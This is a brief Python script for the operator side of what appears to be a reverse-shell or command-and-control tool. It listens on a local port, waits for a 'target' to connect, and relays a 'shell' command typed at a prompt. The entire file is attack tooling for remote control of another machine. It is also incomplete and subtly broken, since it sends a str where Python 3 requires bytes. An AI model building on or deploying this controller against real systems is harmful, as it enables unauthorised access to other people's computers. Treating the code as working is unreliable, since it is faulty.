import socket
import json

HOST = "127.0.0.1" # Address to listen on
PORT = 6969 # Port to listen on. (Better to use unprivileged ports)

def send_command(conn, *args):
    """Send a command to the target"""
    conn.send(json.dumps(args))

def wait_response(conn):
    """Gets a response from the target"""
    data = conn.recv(1024)
    return data

def shell(conn): 
    """Actions performed when the shell command is typed"""
    print("[INFO] Dropping into a shell...")
    send_command(conn, "shell")
    


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.bind((HOST, PORT))
    print(f"[INFO] Listening on {HOST}:{PORT}")
    sock.listen(1) # Wait for an incoming connection
    conn, addr = sock.accept() # Accept the connection. Store the connection and the IP address of the client connecting
    with conn: 
        print(f"[INFO] Connection received from {addr}\n")
        while True:
            command = input("SHELL> ") # Request user command input
            match command: # Parse user command input
                case 'shell':
                    shell(conn)
            data = conn.recv(1024)
            print(data)
